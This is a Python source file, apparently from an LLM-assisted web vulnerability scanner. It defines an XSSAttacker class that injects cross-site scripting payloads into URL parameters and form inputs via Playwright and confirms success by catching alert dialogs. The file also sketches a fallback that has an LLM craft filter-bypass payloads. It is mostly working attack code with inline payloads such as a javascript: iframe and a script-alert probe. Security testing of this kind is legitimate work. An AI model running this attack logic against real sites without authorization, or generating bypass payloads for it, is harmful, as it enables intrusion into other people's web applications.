from typing import Dict, Optional, List
from script.scanner.page_asset import SiteAsset, InputField
from script.attacker.payload.a03_xss_payload import XSSPayloadLib
from script.analysis.owasp_llm_analyzer import PotentialIssue
from attacker.attack_target import AttackResult


class XSSAttacker:
    def __init__(self, llm_proxy):
        # self.context = context  # Playwright BrowserContext
        self.llm_proxy = llm_proxy

    def exploit(self, issue: PotentialIssue, site_asset: SiteAsset, session_context: Dict) -> AttackResult:
        """
        基于 LLM 分析结果执行 XSS 攻击。
        支持两种策略：
        1. 导航注入 (Navigation Attack): 修改 URL 参数 (GET 请求)
        2. DOM 交互 (DOM Interaction): 填写表单并提交
        """
        # Ensure we have the browser context
        if 'playwright_page' in session_context:
            self.context = session_context['playwright_page'].context
        else:
             return AttackResult(
                success=False, vulnerability_type='XSS', severity="Error",
                proof_of_concept='', details="Missing playwright_page in session_context"
            )

        print(f"[*] Analyzing Issue: {issue.owasp_category} at {issue.location}")
        
        # ---------------------------------------------------
        # 1. 注入载体识别 (Vector Identification)
        # ---------------------------------------------------
        # 检查 URL 是否包含查询参数 (e.g. ?q=)
        url_has_params = "?" in issue.url and "=" in issue.url
        
        # 尝试还原 InputField
        target_input: Optional[InputField] = None
        if issue.related_input_id is not None:
            for page in site_asset.pages.values():
                for inp in page.inputs:
                    if inp.internal_id == issue.related_input_id:
                        target_input = inp
                        break
                if target_input: break
        
        if target_input:
            print(f"[*] Target resolved: {target_input.tag} name='{target_input.name}' on {target_input.page_url}")
        else:
            print(f"[*] No specific input field resolved for ID {issue.related_input_id}.")

        # ---------------------------------------------------
        # 2. 准备 Payloads
        # ---------------------------------------------------
        # 简单起见，我们先混用 HTML 和 Attribute 上下文的 payload
        # 或者根据情况判断。如果是 URL 注入，通常上下文比较宽松，或者需要 URL 编码
        payloads = XSSPayloadLib.get_payloads(context="html") + XSSPayloadLib.get_payloads(context="attribute")
        
        page = self.context.new_page()
        try:
            # ---------------------------------------------------
            # 3. 策略 A: 导航攻击 (Navigation Attack)
            # ---------------------------------------------------
            # 如果 URL 包含参数，或是明确的 GET 请求，优先尝试直接构造 URL
            if url_has_params:
                print(f"[*] Vector Identified: URL Parameters. Attempting Navigation Attack on {issue.url}")
                result = self._attack_via_navigation(page, issue.url, payloads)
                if result:
                    return result
            
            # ---------------------------------------------------
            # 4. 策略 B: DOM 交互攻击 (Interaction Attack)
            # ---------------------------------------------------
            if target_input:
                print(f"[*] Vector Identified: Input Field. Attempting DOM Interaction Attack on {target_input.name}")
                context_type = self._infer_context_type(target_input, issue)
                # 重新获取针对该上下文优化的 payload，减少无效尝试
                targeted_payloads = XSSPayloadLib.get_payloads(context=context_type)
                
                result = self._attack_via_dom_interaction(page, target_input, targeted_payloads)
                if result:
                    return result

        except Exception as e:
            print(f"[!] Attack Loop Error: {e}")
        finally:
            page.close()

        # ---------------------------------------------------
        # 5. Fallback: LLM Bypass (如果前面的静态尝试都失败)
        # ---------------------------------------------------
        # 只有在有 Input 对象时才尝试 bypass，或者你可以扩展逻辑支持 URL bypass
        if target_input:
            print("[*] Static payloads failed. Attempting LLM Bypass...")
            # 注意：这里 _perform_llm_bypass 需要适配一下，它原本依赖 target_input
            # 暂时保持原样，仅当 target_input 存在时调用
            context_type = self._infer_context_type(target_input, issue)
            return self._perform_llm_bypass(issue, target_input, context_type)

        return AttackResult(
            success=False, vulnerability_type='XSS', severity="Low",
            proof_of_concept='', request_snapshot={}, response_snapshot="",
            details="All injection strategies failed."
        )

    def _infer_context_type(self, target_input: InputField, issue: PotentialIssue) -> str:
        """推断 DOM 注入点的上下文类型"""
        context_type = "html"
        if target_input.tag == "input" and target_input.input_type not in ["checkbox", "radio"]:
            context_type = "attribute"
        elif target_input.tag == "textarea":
            context_type = "html"
        
        analysis_text = (str(issue.risk_reason) + str(issue.suggested_tests)).lower()
        if "attribute" in analysis_text or "value" in analysis_text:
            context_type = "attribute"
        
        for hint in issue.suggested_tests:
            if '"> ' in hint or "'>" in hint or '" ' in hint:
                context_type = "attribute"
                break
        return context_type

    def _attack_via_navigation(self, page, base_url: str, payloads: List[str]) -> Optional[AttackResult]:
        """
        通过构造含有 Payload 的 URL 进行攻击 (针对 GET 参数)
        """
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

        parsed = urlparse(base_url)
        params = parse_qs(parsed.query, keep_blank_values=True)

        if not params:
            return None

        # 针对每个参数尝试注入
        for param_name in params.keys():
            # 保存原始值
            original_values = params[param_name]
            
            for payload in payloads:
                # Debug Check for specific payload
                if payload == r"<iframe src='javascript:alert(1)'></iframe>":
                    print(f"[DEBUG] >>> Execution reached the specific iframe payload: {payload}")

                # 构造恶意 Query
                # 我们只替换当前遍历到的参数，其他参数保持原样 (或者你可以选择每个都替换)
                # 这里简单策略：替换当前参数的第一个值
                new_params = params.copy()
                new_params[param_name] = [payload] # 替换为 payload
                
                # 重组 URL
                new_query = urlencode(new_params, doseq=True)
                target_url = urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, new_query, parsed.fragment
                ))

                # 监听 & 访问
                # 使用 wait_until='domcontentloaded' 可以显著加快速度，不必等待所有图片加载
                # timeout=3000 (3秒) 给页面足够的执行 JS 时间，同时避免卡死
                if self._check_alert(page, lambda: page.goto(target_url, timeout=3000, wait_until="domcontentloaded")):
                    return AttackResult(
                        success=True, vulnerability_type='XSS', severity="High",
                        proof_of_concept=target_url, request_snapshot={}, response_snapshot="Alert Triggered",
                        details=f"Navigation attack worked on param '{param_name}'"
                    )
        return None

    def _attack_via_dom_interaction(self, page, target_input: InputField, payloads: List[str]) -> Optional[AttackResult]:
        """
        通过 DOM 操作 (fill, press) 进行攻击
        """
        # 必须先去目标页面
        try:
            page.goto(target_input.page_url)
        except Exception:
            return None

        for payload in payloads:
             # 定义触发动作：填入 + 回车
            def trigger_action():
                try:
                    page.fill(target_input.css_selector, payload)
                    page.press(target_input.css_selector, "Enter")
                    page.wait_for_timeout(1000) # 等待执行
                except Exception:
                    pass

            if self._check_alert(page, trigger_action):
                return AttackResult(
                    success=True, vulnerability_type='XSS', severity="High",
                    proof_of_concept=payload, request_snapshot={}, response_snapshot="Alert Triggered",
                    details=f"DOM interaction worked on input '{target_input.name}'"
                )
        return None

    def _check_alert(self, page, trigger_func) -> bool:
        """
        通用辅助函数：执行 trigger_func 并监听弹窗
        """
        xss_triggered = False

        def handle_dialog(dialog):
            nonlocal xss_triggered
            # 如果弹窗内容是 payload 里的数字 (如 '1') 或者 XSS 关键字，视为成功
            if dialog.type == "alert" and (dialog.message == "1" or "xss" in str(dialog.message).lower()):
                print(f"[+] XSS Alert Triggered! Content: {dialog.message}")
                xss_triggered = True
                dialog.accept()
            else:
                dialog.dismiss()

        # 注册监听器
        page.on("dialog", handle_dialog)
        
        try:
            trigger_func()
        except Exception:
            pass
        finally:
            try:
                page.remove_listener("dialog", handle_dialog)
            except:
                pass

        return xss_triggered

    def _perform_llm_bypass(self, issue, target_input, context_type) -> AttackResult:
        """
        发送探测包 -> 获取过滤后的响应 -> 喂给 LLM -> 生成新 Payload -> 测试
        """
        # 1. 发送探测指纹
        fingerprint = "<script>alert(1)</script>\"'"
        # ... (此处省略获取 response_html 的代码，可以使用 page.content() 获取当前 DOM) ...
        # 假设我们拿到了 filter 后的 html
        response_html_snippet = "..."

        # 2. 构造 LLM Context
        bypass_context = {
            "target_url": target_input.page_url,
            "input_element": str(target_input),
            "original_risk_analysis": issue.risk_reason,
            "llm_suggestions": issue.suggested_tests,
            "failed_payload": fingerprint,
            "server_response_snippet": response_html_snippet,  # 让 LLM 看到 payload 变成了什么
            "mutation_strategies": XSSPayloadLib.get_mutation_strategies()
        }

        # 3. 调用 LLM 生成
        # new_payloads = self.llm.generate_bypass(bypass_context)

        # 4. 再次测试 new_payloads ...

        return AttackResult(success=False, vulnerability_type='XSS', severity="Low",
                            proof_of_concept="", request_snapshot={}, response_snapshot="",
                            details="LLM Bypass failed")